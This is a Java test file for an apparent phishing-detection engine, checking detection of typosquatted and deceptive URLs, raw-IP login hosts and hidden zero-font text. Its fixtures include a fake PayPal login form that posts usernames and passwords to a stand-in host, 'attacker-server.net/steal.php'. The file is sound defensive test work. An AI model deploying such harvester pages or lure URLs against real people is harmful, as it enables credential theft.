package com.phishguard.test;

import com.phishguard.model.PhishingType;
import com.phishguard.model.ScanRequest;
import com.phishguard.model.ScanResult;
import com.phishguard.service.HistoryService;
import com.phishguard.service.PhishingScannerService;

/**
 * Automated Verification & Assertion Suite for PhishGuard Engine.
 */
public class PhishingDetectionTest {

    public static void main(String[] args) {
        System.out.println("=================================================");
        System.out.println(" Running PhishGuard Automated Detection Tests... ");
        System.out.println("=================================================");

        HistoryService historyService = new HistoryService();
        PhishingScannerService scanner = new PhishingScannerService(historyService);

        int passed = 0;
        int failed = 0;

        // Test 1: Typosquatting (paypa1.com)
        ScanResult r1 = scanner.scan(new ScanRequest("http://paypa1-security-login.com/verify"));
        if (r1.getRiskScore() >= 65 && r1.getAttackType() == PhishingType.BRAND_TYPOSQUATTING) {
            System.out.println("[PASS] Test 1: Brand Typosquatting correctly identified (Score: " + r1.getRiskScore() + "%)");
            passed++;
        } else {
            System.err.println("[FAIL] Test 1: Typosquatting failed! Score: " + r1.getRiskScore() + "%, Type: " + r1.getAttackType());
            failed++;
        }

        // Test 2: Evil Twin IP Host (http://192.168.1.1/login)
        ScanResult r2 = scanner.scan(new ScanRequest("http://192.168.1.100/bank-signin"));
        if (r2.getRiskScore() >= 30 && r2.getAttackType() == PhishingType.EVIL_TWIN_IP) {
            System.out.println("[PASS] Test 2: Evil Twin IP Host correctly identified (Score: " + r2.getRiskScore() + "%)");
            passed++;
        } else {
            System.err.println("[FAIL] Test 2: Evil Twin IP Host failed! Score: " + r2.getRiskScore() + "%, Type: " + r2.getAttackType());
            failed++;
        }

        // Test 3: Subdomain Deception Spoofing (paypal.com.verify.account.login-update.top)
        ScanResult r3 = scanner.scan(new ScanRequest("http://paypal.com.verify.account.login-update.top/auth"));
        if (r3.getRiskScore() >= 65) {
            System.out.println("[PASS] Test 3: Subdomain Deception correctly identified (Score: " + r3.getRiskScore() + "%)");
            passed++;
        } else {
            System.err.println("[FAIL] Test 3: Subdomain Deception failed! Score: " + r3.getRiskScore() + "%");
            failed++;
        }

        // Test 4: Credential Harvester with Offsite Form Action
        String fakeHtml = "<html><head><title>PayPal Login</title></head><body>"
                        + "<form action='http://attacker-server.net/steal.php'>"
                        + "<input type='text' name='username'>"
                        + "<input type='password' name='password'>"
                        + "<button type='submit'>Sign In</button>"
                        + "</form></body></html>";
        ScanResult r4 = scanner.scan(new ScanRequest("http://unrelated-domain.com/login", fakeHtml));
        if (r4.getRiskScore() >= 65 && r4.getAttackType() == PhishingType.CREDENTIAL_HARVESTER) {
            System.out.println("[PASS] Test 4: Credential Harvester with Offsite Action identified (Score: " + r4.getRiskScore() + "%)");
            passed++;
        } else {
            System.err.println("[FAIL] Test 4: Credential Harvester failed! Score: " + r4.getRiskScore() + "%, Type: " + r4.getAttackType());
            failed++;
        }

        // Test 5: Obfuscated Zero-Font HTML
        String obfuscatedHtml = "<html><body>"
                              + "<div style='font-size:0px;'>verify account banking security paypal</div>"
                              + "<h1>Welcome</h1>"
                              + "</body></html>";
        ScanResult r5 = scanner.scan(new ScanRequest("http://suspicious-site.xyz", obfuscatedHtml));
        if (r5.getRiskScore() >= 30) {
            System.out.println("[PASS] Test 5: Zero-Font Obfuscation identified (Score: " + r5.getRiskScore() + "%)");
            passed++;
        } else {
            System.err.println("[FAIL] Test 5: Obfuscation failed! Score: " + r5.getRiskScore() + "%");
            failed++;
        }

        // Test 6: Legitimate Benign Site (https://www.chase.com)
        ScanResult r6 = scanner.scan(new ScanRequest("https://www.chase.com/personal/banking"));
        if (r6.getRiskScore() < 30) {
            System.out.println("[PASS] Test 6: Benign Legitimate Site correctly identified (Score: " + r6.getRiskScore() + "%)");
            passed++;
        } else {
            System.err.println("[FAIL] Test 6: Benign site marked suspicious! Score: " + r6.getRiskScore() + "%");
            for (com.phishguard.model.RiskFactor rf : r6.getRiskFactors()) {
                System.err.println("   Factor: " + rf);
            }
            failed++;
        }

        // Test 7: Scan history storage round trip (MySQL if available, otherwise in-memory)
        System.out.println("[INFO] Storage: " + historyService.getDatabaseStatus());
        boolean found = false;
        for (ScanResult h : historyService.getRecentScans()) {
            if (r1.getScanId().equals(h.getScanId()) && h.getRiskScore() == r1.getRiskScore()
                    && r1.getRiskLevel().equals(h.getRiskLevel())) {
                found = true;
                break;
            }
        }
        if (found) {
            System.out.println("[PASS] Test 7: Scan saved and read back from history");
            passed++;
        } else {
            System.err.println("[FAIL] Test 7: Scan " + r1.getScanId() + " not found in history!");
            failed++;
        }

        System.out.println("\n-------------------------------------------------");
        System.out.println(" TEST RESULTS: Passed [" + passed + "/" + (passed + failed) + "] | Failed [" + failed + "]");
        System.out.println("-------------------------------------------------");

        if (failed > 0) {
            System.exit(1);
        }
    }
}
